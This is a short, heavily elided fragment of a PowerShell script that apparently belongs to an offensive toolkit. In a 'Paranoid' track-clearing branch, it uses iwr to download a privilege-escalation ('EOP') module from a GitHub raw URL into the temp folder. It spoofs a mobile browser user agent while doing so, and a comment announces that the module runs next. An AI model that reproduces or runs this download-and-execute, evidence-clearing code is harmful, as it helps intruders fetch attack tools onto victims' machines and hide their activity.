...
If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
{
   ...
   If($CleanTracks -ieq "Paranoid")
   {
      ...
      Else
      {
         ...
         #Download EOP module from my github
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1" -OutFile "$Env:TMP\GetLogs.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
         ...
         #Execute EOP Module from this console
